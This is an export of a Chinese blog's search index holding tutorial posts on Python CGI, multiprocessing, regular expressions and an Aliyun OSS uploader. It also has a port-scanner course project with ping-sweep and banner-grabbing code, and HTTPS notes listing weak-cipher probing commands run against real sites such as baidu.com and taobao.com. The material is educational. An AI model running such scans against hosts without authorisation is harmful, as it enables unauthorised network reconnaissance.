        <tag>python</tag>
        <tag>线程池</tag>
        <tag>进程池</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python CGI编程]]></title>
    <url>%2F2018%2F06%2F17%2Fpython-CGI%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[python CGI编程###什么是CGI CGI(Commom Gateway Interface)通用网关接口，它是一段程序，运行在服务器。如HTTP服务器，提供同客户端HTML页面的接口。 网页浏览 通过在网页上点击一个链接或URL的流程了解CGI是如何工作的 使用浏览器访问URL连接到HTTP web 服务器 web 服务器接收到请求以后解析URL，并查找访问文件是否在HTTP服务器上存在，如果存在返回内容，不存在返回错误信息 CGI程序可以是python脚本，Perl脚本，shell脚本，C或C++程序等 CGI架构图及其本地环境配置 采用PHPstudy+windows测试，修改httpd.conf配置文件 123456789101112131415# 查找一下自己的DocumentRoot DocumentRoot &quot;E:\Environment\phpstudy\PHPTutorial\WWW&quot;&lt;Directory /&gt; AllowOverride All Options +ExecCGI Order allow,deny Allow from all #Require all granted&lt;/Directory&gt;#让apache识别py文件为cgi程序：AddHandler cgi-script .cgi .py 只允许在特别目录下执行cgi程序:ScriptAlias /cgi-bin/ &quot;D:/Program/phpStudy/Apache/cgi-bin/&quot; 测试实例（python不用指定编码，测试了时候指定编码出现乱码） 12345678910111213141516#!D:/python36/python.exeprint ("Content-type:text/html")print () # 空行，告诉服务器结束头部print ('&lt;html&gt;')print ('&lt;head&gt;')# print ('&lt;meta charset="UTF-8"&gt;')print ('&lt;title&gt;Hello Word 你好123！&lt;/title&gt;')print ('&lt;/head&gt;')print ('&lt;body&gt;')print ('&lt;h2&gt; Hello Word! 菜鸟123&lt;/h2&gt;')print ('&lt;/body&gt;')print ('&lt;/html&gt;')#作为http协议的要求，一定要输出http headers#在存在http headers的前提下，一定要在headers后面打印一个空行，否则服务器会报错 CGI HTTP头部及CGI环境变量 CGI实例 通过CGI输出CGI环境变量 12345678910#!D:/python36/python.exeimport osprint("Content-type: text/html")print()print("&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;")print("&lt;ul&gt;")for i in os.environ.keys(): print("&lt;li&gt;&lt;span style='color:green'&gt;%30s&lt;/span&gt; : %s&lt;/li&gt;" % (i,os.environ[i]))print("&lt;/ul&gt;") 通过CGI实现GET传递信息（也可以通过构造表单的方法实现GET信息传递，默认情况下只存放脚本文件） 123456789101112131415161718192021#!D:/python36/python.exeimport cgi, cgitb#创建filedstorage的实例、form = cgi.FieldStorage()#获取数据s_name = form.getvalue('name')s_url = form.getvalue('url')print("Content-type:text/html")print()print("&lt;html&gt;")print("&lt;head&gt;")print("&lt;title&gt;测试&lt;/title&gt;")print("&lt;/head&gt;")print("&lt;body&gt;")print("&lt;h2&gt;%s博客：%s&lt;/h2&gt;" % (s_name,s_url))print("&lt;/body&gt;")print("&lt;/html&gt;") 通过CGI用POST传递数据（使用上面的GET脚本结合表单来POST传递） 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;菜鸟&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="get1.py" method="post"&gt;站点名称: &lt;input type="text" name="name"&gt; &lt;br /&gt;站点 URL: &lt;input type="text" name="url" /&gt;&lt;input type="submit" value="提交" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;/form&gt; 通过CGI程序来传递CheckBox数据（需要一个表单和CGI处理的脚本文件） cgi脚本文件 123456789101112131415161718192021222324252627#!D:/python36/python.exeimport cgi, cgitbform = cgi.FieldStorage()#接收字段数据if form.getvalue('google'): google_flag = "是"else: google_flag = "否"if form.getvalue('lsowl'): lsowl_flag = "是"else: lsowl_flag = "否"print("Content-type:text/html")print()print("&lt;html&gt;")print("&lt;head&gt;")print("&lt;title&gt;测试&lt;/title&gt;")print("&lt;/head&gt;")print("&lt;body&gt;")print("&lt;h2&gt;lsowl是否选择了 : %s&lt;/h2&gt;" % lsowl_flag)print("&lt;h2&gt;google是否选择了 : %s&lt;/h2&gt;" % google_flag)print("&lt;/body&gt;")print("&lt;/html&gt;") 传递数据的表单 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="checkbox.py" method="POST" target="_blank"&gt;&lt;input type="checkbox" name="lsowl" value="on" /&gt; lsowl&lt;input type="checkbox" name="google"value="on" /&gt; google&lt;input type="submit" value="选择站点"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 通过CGI传递Radio数据（只向服务器传输一个数据） 传递Radio数据的CGI脚本 123456789101112131415161718192021#!D:/python36/python.exeimport cgi, cgitbform = cgi.FieldStorage()if form.getvalue('site'): site = form.getvalue('site')else: site = '提交的数据为空'print ("Content-type:text/html")print ()print ("&lt;html&gt;")print ("&lt;head&gt;")print ("&lt;title&gt;测试&lt;/title&gt;")print ("&lt;/head&gt;")print ("&lt;body&gt;")print ("&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;" % site)print ("&lt;/body&gt;")print ("&lt;/html&gt;") 传递Radio数据的CGI表单 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="radion.py" method="post" target="_blank"&gt;&lt;input type="radio" name="site" value="lsowl" /&gt; lsowl&lt;input type="radio" name="site" value="google" /&gt; Google&lt;input type="submit" value="提交" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 通过CGI程序传递 Textarea 数据、下拉数据等、设置cookie、上传下载文件，这些只需要改一些HTML方法就可以实现，和上面的本质上没有什么区别 总结 本文是对python的CGI编程的一个学习，学习了CGI及python CGI编程的特性，通过CGI结合前端实现许多功能，由于后面上传下载文件这些只是修改一些方法和HTML元素，本质上差别不大，就没有写完了，可以参考链接 tp://www.runoob.com/python3/python3-cgi-programming.html]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>CGI编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多进程]]></title>
    <url>%2F2018%2F06%2F16%2Fpython%E5%A4%9A%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[python多进程 python跨平台实现多进程需要使用multiprocessing这个模块，在模块中常用的两个类是process和pool process类 process类用来描述一个进程对象。创建子进程的时候只需要传入一个执行函数和函数的参数就可以完成process实例的创建。 start() 方法启动进程 join() 方法实现进程之间的同步，等待所有进程退出 close()方法阻止多余的进程涌入进程池pool造成进程阻塞 1234567891011121314151617181920212223242526272829303132333435363738394041 __init__(self, group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *,mon=None)| 初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的|| is_alive(self)| 返回这个进程是否alive|| join(self, timeout=None)| 等待，直到子进程执行完毕|| run(self)| Method to be run in sub-process; can be overridden in sub-class|| start(self)| 开启子进程|| terminate(self)| 结束进程| ----------------------------------------------------------------------| Data descriptors inherited from multiprocessing.process.BaseProcess:|| __dict__| dictionary for instance variables (if defined)|| __weakref__| list of weak references to the object (if defined)|| authkey|| daemon| 返回该进程是否为守护进程|| exitcode| 返回进程的退出代码|| ident| Return identifier (PID) of process or `None` if it has yet to start|| name|| pid| Return identifier (PID) of process or `None` if it has yet to start process类使用实例 123456789101112131415import multiprocessing,os def run_proc(name): print('Child process &#123;0&#125; &#123;1&#125; Running'.format(name,os.getpid())) if __name__ == '__main__': print('Parent process &#123;0&#125; is Running'.format(os.getpid())) for i in range(5): p = multiprocessing.Process(target=run_proc,args=(str(i),)) print('process start') p.start() p.join() print('process close') #这里创建多个进程可以使用for循环，也可以使用进程池，在使用for循环的时候注意join方法在for循环之外 Pool类 Pool类可以提供指定数量的进程供用户使用，默认是CPU核数。当有新的请求提交到Pool的时候，如果进程池没有满，则会创建一个进程执行，如果进程池满了，则会让该请求等待。 Pool对象调用join方法会等待所有的子进程执行完毕 调用join方法前必须调用close() 调用close()以后就不能继续添加新的Process pool.apply_async() 直接启动了进程，不用使用start来启动（同步执行进程，允许多个进程同时进入进程池） pool类使用实例（使用apply_async()来执行进程） 123456789101112131415161718import multiprocessingimport osimport time def run_task(name): print('Task &#123;0&#125; pid &#123;1&#125; is Running, Parent id is &#123;2&#125;'.format(name,os.getpid(),os.getppid())) time.sleep(1) print('Task &#123;0&#125; end'.format(name)) if __name__ == '__main__': print('current process &#123;0&#125;'.format(os.getpid())) p = multiprocessing.Pool(processes=3) for i in range(6): p.apply_async(run_task,args=(i,)) print('Waiting for all subprocesses done...') p.close() p.join() print('All process done!') pool使用实例（pool.apply(func[,args[，kwds]]) 只允许一个进程进入进程池，在一个进程结束以后，另外一个进程才可以进入执行） 123456789101112131415161718import multiprocessingimport osimport time def run_task(name): print('Task &#123;0&#125; pid &#123;1&#125; is running, parent id is &#123;2&#125;'.format(name, os.getpid(), os.getppid())) time.sleep(1) print('Task &#123;0&#125; end.'.format(name)) if __name__ == '__main__': print('current process &#123;0&#125;'.format(os.getpid())) p = multiprocessing.Pool(processes=3) for i in range(6): p.apply(run_task,args=(i,)) print('Waiting for all subprocesses done...') p.close() p.join() print('All process done!') 进程间的通信 使用python标准库中的subprocess包来fork一个子进程，并运行一个外部的程序 subprocess.call(command,shell=True) fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果 subprocess.check_output(command) 将外部命令执行结果放入变量，不在控制台输出 可以看出subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果 multiprocessing提供的Queue（Queue用来在多个进程间的通信，Queue有两个方法，get和put） put方法用来插入数据到队列中。有两个可选参数，blocked和timeout blocked = True（默认值），timeout 为正 该方法会阻塞 timeout 指定的时间，直到该队列有剩余空间。如果超时，抛出 Queue.Full 异常 blocked = False 如果 Queue 已满，立刻抛出 Queue.Full 异常 get方法用来从队列中读取并删除一个元素。有两个参数可选，blocked 和 timeout blocked = False （默认），timeout 正值 等待时间内，没有取到任何元素，会抛出 Queue.Empty 异常 blocked = True Queue 有一个值可用，立刻返回改值；Queue 没有任何元素 Queue实例 123456789101112131415161718192021222324252627282930313233from multiprocessing import Process, Queueimport os, time, random #写数据进程def proc_write(q,urls): print('Process &#123;0&#125; is writing...'.format(os.getpid())) for url in urls: q.put(url) print('Put %s to queue..' % url) time.sleep(random.random()) #读数据进程def proc_read(q): print('Process &#123;0&#125; is reading...'.format(os.getpid())) while True: url = q.get(True) print('Get %s from queue...' % url) if __name__ == '__main__': q = Queue() proc_write1 = Process(target=proc_write,args=(q,['url_1','url_2','url_3','url_4'])) proc_write2 = Process(target=proc_write,args=(q,['url_4','url_5','url_6'])) proc_reader = Process(target=proc_read,args=(q,)) #启动子进程写入 proc_write1.start() proc_write2.start() #启动子进程读取 proc_reader.start() #等待写入进程结束 proc_write1.join() proc_write2.join() #proc_reader进程是死循环，无法等待结束，只能强行终止 proc_reader.terminate() multiprocessing提供的Pipe(常用来在两个进行间的通信，两个进程分别位于管道的两端) multiprocessing.Pipe([duplex]) pipe实例一（发送列表） 12345678910111213from multiprocessing import Process, Pipe def send(pipe): pipe.send(['spm']+[545,'wdd']) #send传输一个列表 pipe.close() if __name__ == '__main__': #实例化两个pipe对象，因为pipe进程通信实在管道的两边 (c1,c2) = Pipe() sender = Process(target=send,args=(c1,)) sender.start() print("c2 got: &#123;0&#125; ".format(c2.recv())) c2.close() pipe实例二（发送字典文件） 123456789101112131415from multiprocessing import Process, Pipe def talk(pipe): pipe.send(dict(name='ss',age=22)) reply = pipe.recv() print('talk got:',reply) if __name__ == '__main__': (a1, a2) = Pipe() c = Process(target=talk, args=(a2,)) #创建一个进程 c.start() print('parent got:',a1.recv()) a1.send(&#123;x * 2 for x in 'spam'&#125;) c.join() #传输的数据被 talk 函数内的 pip 管道接收，并赋值给 reply print('parent exit') 上述的queue和pipe都是进程间的通信，实在一个进行池中，如果不在一个进程池中，用multiprocessing.Manager().Queue() 通信；同时：子进程与父进程的通信试用subprocess比较好 不同进程池之间的通信实例如下 123456789101112131415161718192021222324252627282930313233343536373839404142from multiprocessing import Process,Pool,Queue,Managerimport os,time,random def write(q,list,i): print("[+] This is Process_"+str(i)+" and pid is %s START"%os.getpid()) for item in list: q.put(item) print("[+] Pid %s Put : %s"%(os.getpid(),item)) print("[+] This is Process_"+i+" and pid is %s CLOSE"%os.getpid())def test(): print(os.getpid()) def read(q): print('[====] Process to Read , pid = %s'%os.getpid()) while True: data = q.get(True) print("[=] data from Queue : %s"%str(data)) def main(): manager = Manager() q = manager.Queue() p = Pool(5) listx = [] listx.append([x for x in range(10)]) listx.append([x for x in range(100,110)]) listx.append([x for x in range(200,210)]) listx.append([x for x in range(300,310)]) listx.append([x for x in range(400,410)]) for i in range(5): if i==4: pass p.apply_async(read,args=(q,)) else: list = listx[i] #print(list) p.apply_async(write,args=(q,list,i)) p.close() p.join() if __name__ == '__main__': main() 总结 通过一些实例学习python3的多进程，包含了主要的两个类及其适用方法；同一进程池中进程间通信，不同进程池中进程间的通信以及父类与子类的进程间通信]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3正则表达式学习]]></title>
    <url>%2F2018%2F06%2F15%2Fpython3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[python3正则表达式学习 正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。 compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 正则表达式基础 子模式 1234\w: 匹配任意字母、数字、或者_\d: 匹配数字（十进制）\s: 匹配空白符号（空格、tab等）. : 匹配任意字符（换行符除外） 重复子模式 123\d* : 表示任意数字，包括0个，*匹配0次或者多次\w+ : 表示匹配至少一个字母、数字、或者_\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_ “或”运算 - | (p|P)ython :可以匹配Python也可以匹配python 选择符：？ 1(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz https://lsowl.xyz www.lsowl.xyz lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到 字符集：[] 12[a-zA-Z0-9_] : 等价于\w[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_ 开始符和结尾符：^ , $ 123^\d : 以数字开始\w$ : 以字母结尾^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量 分组: () 捕获组 (^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名 非捕获组 123(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名(?:\d+\.)&#123;3&#125;\d+ : 匹配IP 正则表达式使用的特殊符号和字符 12345678910111213141516171819202122literal 匹配字符串的值re1|re2 匹配正则表达式re1或re2. 匹配任意字符（换行符除外）^ 匹配字符串的开始$ 匹配字符串的结尾* 匹配前面出现的正则表达式零次或多次+ 匹配前面出现的正则表达式一次或多次？匹配前面出现的正则表达式零次或一次&#123;N&#125; 匹配前面出现的正则表达式N次&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式[…] 匹配字符组里出现的任意一个字符[…x-y…] 匹配从字符x到y中的任意一个字符[^…] 不匹配此字符集中出现的任意一个字符(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。(…) 匹配封闭括号中正则表达式（RE），并保存为子组\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）\b 匹配单词边界(\B是\b的反义)\nn 匹配已保存的子组（参考(…)）如price:\16\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）\A（\Z）匹配字符串的起始（结束） 一些说明 （1）用管道符号(|)匹配多个正则表达式（2）匹配除换行符外任意一个单个的字符（.）（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）（4）创建字符类（[]）（5）指定范围（-）和否定（^）（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配（7）？的两种含义： 表示匹配出现0或1次； 紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。 （7）特殊字符表示、字符集 \d表示十进制数字（\D表示非十进制数字） \w表示整个字符数字的字符集（\W） \s表示空白字符（\S） （8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。 python的re模块 re模块的用法 1234567891011import restr = "xxxflag&#123;sss&#125;sss"# #用法1：re_flag = re.compile(r'flag&#123;\w+?&#125;')flag = re_flag.findall(str)print(flag)#用法2：flag =re.findall(r'flag&#123;\w+?&#125;',str)print(flag) 贪心匹配和非贪心匹配 贪心匹配：正则表达尽可能多的匹配元素 非贪心匹配：正则表达式尽可能少的匹配元素 match和search的区别 match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None search匹配整个字符串，直到找到一个匹配 分组匹配（优点在说明第（8）点） python中常用的正则表达式处理函数 re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none 函数语法 re.match(partten,string,flags=0) 函数参数说明 使用group(num)或groups()匹配对象函数来获取匹配表达式 re.search() 扫描整个字符串并返回第一个成功的匹配 函数语法 re.search(pattern,string,flags=0) 使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 re.sub()用于替换字符串中的匹配项 函数语法 re.sub(pattern,repl,string,count=0) 函数参数说明 使用实例(包含是否使用repl参数的，repl可能是个函数) re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用 函数语法 re.compile(pattern[, flags]) 参数说明 使用实例（当匹配成功的时候返回一个match对象） re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表 函数语法 findall(string[, pos[, endpos]]) 函数参数 使用实例（用compile函数生成正则表达式对象） re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回 函数语法 re.finditer(pattern, string, flags=0) 函数参数 使用实例(用for循环迭代输出) re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 函数语法 re.split(pattern, string[, maxsplit=0, flags=0]) 函数参数 使用实例（对于一个找不到匹配的字符串，split不会分割） 正则表达式对象 re.RegexObject (re.compile() 返回的就是一个正则表达式对象) group()返回被RE匹配的字符串 start() 返回开始匹配的位置 end() 返回匹配结束的位置 span()返回一个元组包含（开始，结束）的位置]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简易端口扫描器]]></title>
    <url>%2F2018%2F06%2F14%2F%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。 程序运行实例 打印装逼信息： 扫描实例： 具体用法程序中有说明 程序说明 程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。 通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下： 123456789101112131415161718192021def run(self): try: cmd = ["ping", "-&#123;op&#125;".format(op=self.get_os()), "1", self.ip_pre] output = os.popen(" ".join(cmd)).readlines() except: return False if lock.acquire(): flag = False for line in list(output): if not line: continue if str(line).upper().find("TTL") &gt;=0: flag = True break if flag: print "[+] IP: %s is OK " % self.ip_pre ip_str.append(self.ip_pre) lock.release() return True 通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下： 123456789101112131415161718192021def Ping(self, Port): global OpenPort, lock, Timeout sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.settimeout(Timeout) address = (self.IP, Port) try: sock.connect(address) ready = select.select([sock],[],[],1) except: return False if lock.acquire(): OpenPort.append(str(Port)) ScanIP_list.append(self.IP) if ready[0]: print "IP:%s Port:%d Open " % (self.IP, Port) +sock.recv(4096) sock.close() else: print "IP:%s Port:%d Open " % (self.IP, Port) + "Unknow!\n" sock.close() lock.release() return True 通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下： 1234def run(self): while not self.SingleQueue.empty(): p = self.SingleQueue.get() self.Ping(p) 调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码） 1234567891011121314151617def do_port(self, argv): global PortList PortList = [] ListTmp = argv.split(' ') for port in ListTmp: if port.find("..") &lt; 0: if not port.isdigit(): print "Input error!" return False PortList.append(int(port)) else: RangeLst = port.split("..") if not (RangeLst[0].isdigit() and RangeLst[1].isdigit()): raise ValueError exit() for i in range(int(RangeLst[0]), int(RangeLst[1])): PortList.append(i) 123456789101112131415161718192021def do_scan(self, argv): print "Start Time %s" % time.ctime() + '\n' global nThread, PortList, strIP, ScanIP_list, OpenPort del ScanIP_list[:] del OpenPort[:] ThreadList = [] try: strIP = socket.gethostbyname(str(argv)) except: print "Input error!" return False SingleQueue = GetQueue(PortList) if PortList != None: for i in range(0, nThread): t = ScanThreadSingle(strIP, SingleQueue) ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join() print '\n' + "End Time %s" % time.ctime() 1234567891011121314151617def do_ping(self, argv): global commandargs ThreadList = [] print "Start Time %s" % time.ctime() + '\n' commandargs = str(argv) print "[+] Input is %s " % commandargs + '\n' args = "".join(commandargs) ip_prefix = '.'.join(args.split('.')[:-1]) for i in range(1,255): ip = '%s.%s' % (ip_prefix,i) s = PING(ip) ThreadList.append(s) for s in ThreadList: s.start() for s in ThreadList: s.join() print '\n' + "End Time %s" % time.ctime() 这些就是整个程序中核心的几个模块，具体代码请看源码。 总结 此次设计参考了P牛早期的一个设计以及Python线程锁的处理方法。实现的功能比较单一，还可以添加SYN半连接扫描、UDP扫描、僵尸扫描等功能；但是由于Windows底层的原因，利用Python在Windows上构造数据包有些困难；在linux上可以通过scapy进行原始数据包的构造与发送，通过网络流量中的一些特征来判断。一些扫描脚本可以看四层发现中的一些脚本。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云OSS智能上传图床]]></title>
    <url>%2F2018%2F06%2F13%2F%E9%98%BF%E9%87%8C%E4%BA%91OSS%E5%82%A8%E5%AD%98%E6%99%BA%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[背景：由于现在云储存的发展，许多东西储存到云端更加方便，比如：图片；网上最多的工具就是七牛云以及上传利用工具，但是七牛云需要手持身份证实名认证，所以放弃；其次没有关注腾讯云，所以选择了阿里云，其实优惠力度还是腾讯的比较大；为了避免麻烦，就没有在做迁移了，使用过的可以与阿里云关联的极简图床，但是我们还是需要一张张的拖图片，然后复制makedown连接，这样还是太麻烦了，有一天看到大佬写了一个腾讯云的工具，所以，在学习之余写了这个工具。 程序流程图如下： 功能实现图片截图以后，从粘贴板获取图片保存到本地Image文件夹下 使用win32clipboard，win32con，PIL模块 1234import win32conimport win32clipboard as wfrom PIL import ImageGrabfrom PIL import Image 123im = ImageGrab.grabclipboard() #从粘贴板获取内容 if isinstance(im,Image.Image): #判断是不是图片 name = str(time.time()) + ".png" 获取到图片以后判断是否为图片然后保存到本地 这里说明一点：PIL模块是处理图像的，使用PIL处理过图像以后是使图像变小，有利于进行云储存 将图片上传以后的生成的访问地址添加到粘贴板 使用win32clipboard，win32con模块 12345def setText(self,aString): w.OpenClipboard() w.EmptyClipboard() w.SetClipboardData(win32con.CF_TEXT,aString) w.CloseClipboard() 这里存在一个坑：win32con.CF_TEXT这里在Python2中会将所有的字符串添加到粘贴板，早Python3中只会添加首个字符，解决办法：将CF_TEXT替换为CF_UNICODETEXT，如果在Python2中使用CF_UNICODETEXT会出现添加到粘贴板的字符是乱码 上传图片到OSS 使用oss2、shutil 模块，oss2是官方提供的Python OSS SDK，支持Python2、3 123456def upload(self,file_name,name): bucket = oss2.Bucket(oss2.Auth(self.acc_id,self.acc_secret),self.endpoint,self.bucket_name) data = bucket.put_object_from_file(key='Blog/'+ name,filename='image/'+ name, headers=None, progress_callback=None) str = "https://xxxxxx.xx/" + name shutil.rmtree('image') 这里要在外部的 config文件中配置好阿里云提供的：Access Key ID、Access Key Secret、bucket_name、endpoint 说明：由于阿里云的SDK默认不支持文件夹，目录的概念，所以通过添加’/‘来表示在那个文件夹下；又由于没有返回文件访问连接地址的接口，所以通过固有的形式进行组合 shutil模块进行清空本地存放已经上传完的的图片（这样会删除文件夹，比遍历更加快速），这一点看个人了，可有可无，也可以使用os模块进行相应的操作。 设置阿里云OSS的接口信息 通过外部的config文件导入 123456789101112131415try: infoDict = &#123;&#125; with open("config.conf","r") as file: ApiInfo = file.readlines() for info in ApiInfo: try: if info != "\n" and info != "": tmp = info.split("=") infoDict[tmp[0].strip()] = tmp[1].strip() except Exception as e: print u"[-] 请按照要求配置config.conf" sys.exit() except Exception as e: print u"[-] 请在config.conf中配置阿里云 API信息" sys.exit() 结果示例 参考文章 [OSS SDK-Python]:https://github.com/aliyun/aliyun-oss-python-sdk 更新说明 现在已经修改可以支持python3的环境，详情请看github]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS攻击]]></title>
    <url>%2F2018%2F06%2F13%2FHTTPS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[在学习HTTPS攻击之前首先要了解为什么要进行全站HTTPS，全站HTTPS的应用会让链路中的流量加密传输，在HTTP协议明文传输时会发生链路劫持等情况，不论是黑客还是运营商劫持的难度较低，全站HTTPS的应用大大的提高了劫持的难度。在理论上所有的加密都是可以破解的，前提就是看你是否接受这个成本。目前全站HTTPS的应用已经很广泛了，如百度、淘宝等。 HTTPS及其相关知识 HTTPS的作用 CIA(信息安全三要素：机密性、完整性、可用性（HTTPS中是合法用户可以访问权限以内的资源）) 解决的是信息在传输过程中数据被篡改、窃取 加密：对称、非对称、单向 HTTPS攻击方法 降级攻击（HTTPS加密套件是多种加密方式，强制采用低强度的加密方式） 解密攻击（明文、证书伪造） 协议漏洞、实现方法的漏洞、配置不严格（漏洞来源的角度） SSL（全称Secure socket layer） 保证网络通信安全的加密协议 TLS取代SSL v3(由于SSL协议漏洞使得大家认为其漏洞不可软件修复） Heartbleed POODLE BEAST SSL/TLS用于其他场景的传输通道加密 邮件传输（服务器间、客户端与服务期间） 数据库服务器间的通信 LDAP身份认证服务器间的通信 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 WEB通信中的SSL加密 公钥证书（受信任的第三方证书颁发机构签名颁发） Versign Thawte Globalsign Symantec 加密过程 握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输 常见的加密算法 非对称加密算法（适合加密少量的数据） Diffie-Hellman key exchange RSA ECC 对称加密算法（适合加密大量的数据） DES / 3DES AES （主流对称加密算法） IDEA RC4（生命周期短） WEP、TLS/SSL、RDP、secure shell 单向加密算法（hash） MD5 SHA-1 、 SHA-2 SHA-2是TLS1.2唯一支持的单向加密算法 碰撞攻击针对单向加密算法（两个不同的文件生成相同的hash值） SSL的弱点 SSL是不同的对称、非对称、单向加密算法的组合加密实现（加密套件） 服务器端为了提供更好的兼容性，选择支持大量过时的cipher suite 协商过程中强迫降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法（使用云计算） HTTPS实践在实际中针对目标站点进行探测查看它使用的HTTPS的各种信息 openssl(用户层的一个操作系统命令，直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite) 使用OpenSSL连接探测 openssl s_client -connect www.baidu.com:443 探测目标站点是否支持不安全的加密套件 openssl s_client -tls1_2 -cipher &#39;NULL,EXPORT,LOW,DES&#39; -connect www.baidu.com:443 通过OpenSSL查看不安全的加密套件 openssl ciphers -v &#39;NULL,EXPORT,LOW,DES&#39; 使用SSLScan识别 自动识别SSL配置错误、过期协议、过时cipher suite和hash算法 默认检测CRIME、heartbleed漏洞 测试支持TLS_1.2: sslscan --tlsall www.taobao.com:443 分析证书的详细信息 sslscan --show-certificate --no-ciphersuites www.taobao.com:443 SSLyze探测 Python编写 检测SSL过时版本、存在弱点的cipher suite、是否支持会话恢复 sslyze --regular www.taobao.com 进行信息的探测 nmap脚本探测： sudo nmap --script=ssl-enum-ciphers.nse www.taobao.com 